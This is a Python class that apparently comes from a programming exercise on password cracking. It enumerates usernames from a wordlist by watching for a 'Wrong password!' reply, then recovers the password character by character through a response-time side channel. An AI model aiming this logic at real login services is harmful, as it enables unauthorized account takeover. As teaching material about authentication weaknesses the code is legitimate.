import json
import string
from os.path import exists

from logger_config import logger

LOGIN_FILE_NAME = 'logins.txt'
RANDOM_PASSWORD = 'random_password'
CHAR_SET = {*string.ascii_letters, *string.digits}


class PasswordHacker:
    """
    A class to handle the logic for hacking passwords by sending login and password data to a server.

    Attributes:
        file (io.TextIOWrapper): The file object for reading login data.
        login (str): The current login being tested.
        password (str): The current password being built and tested.
        password_correct (bool): A flag indicating if the correct password has been found.
    """

    def __init__(self):
        """
        Initializes the PasswordHacker with default values for login, password, and password_correct.
        """
        self.file = None
        self.login = None
        self.password = ''
        self.password_correct = False

    def load_login_file(self, file_name: str = LOGIN_FILE_NAME) -> None:
        """
        Loads the login file and prepares it for reading.

        Logs an error and exits if the file does not exist, otherwise logs a successful load message.
        :param file_name: String containing the name of the login file to load. Defaults to LOGIN_FILE_NAME.
        :return: None
        """
        if not exists(file_name):
            logger.error(f'File: "{file_name}" does not exist')
            exit(1)
        self.file = open(file_name, 'r')
        logger.info(f'File: "{file_name}" loaded successfully')

    def close_file(self) -> None:
        """
        Closes the currently opened login file.

        Logs an error if the file is not open, otherwise logs a successful closure.
        :return: None
        """
        if self.file:
            self.file.close()
            logger.info(f'File: "{LOGIN_FILE_NAME}" closed successfully')
        else:
            logger.error(f'File: "{LOGIN_FILE_NAME}" is not opened')

    def _generate_lines(self) -> str:
        """
        Generates stripped lines from the login file.
        :return: String yielding the next stripped line from the file.
        """
        yield from (line.strip() for line in self.file)

    def serialize_login_data(self) -> json.dumps:
        """
        Serializes login data from the loaded login file.
        :return: A JSON object containing the login and a random password.
        """
        for login in self._generate_lines():
            request = {
                'login': login,
                'password': RANDOM_PASSWORD
            }
            self.login = login
            yield json.dumps(request)

    def is_login_correct(self, message: str) -> bool:
        """
        Checks if the login is correct based on the server's response.

        Logs the correct login name and closes the file if the login is correct.
        :param message: String containing the response message from the server.
        :return: True if the login name is correct; False otherwise.
        """
        response = json.loads(message)
        if response['result'] == 'Wrong password!':
            logger.info(f'Correct login name: "{self.login}"')
            self.close_file()
            return True
        return False

    def serialize_password_data(self) -> json.dumps:
        """
        Serializes password data to be sent to the server for cracking passwords.
        :return: A JSON object containing the login and the current password.
        """
        for char in CHAR_SET:
            self.password += char
            request = {
                'login': self.login,
                'password': self.password
            }
            yield json.dumps(request)

    def is_char_in_password(self, message: str, duration: float) -> bool:
        """
        Checks if the current character is part of the correct password based on the server's response time.

        Logs the correct password if found, and trims the last character if it was not correct.
        :param message: String containing the response message from the server.
        :param duration: Float containing the duration taken to receive the response from the server.
        :return: True if the character is part of the correct password; False otherwise.
        """
        response = json.loads(message)
        if response['result'] == 'Connection success!':
            self.password_correct = True
            logger.info(f'Correct password: "{self.password}"')
            return True
        elif duration > 0.09:
            return True
        else:
            self.password = self.password[:-1]
            return False

    def show_credentials(self) -> None:
        """
        Displays the final cracked credentials.

        Prints the login and password in a formatted JSON string.
        :return: None
        """
        result = {
            'login': self.login,
            'password': self.password
        }
        print(json.dumps(result, indent=4))
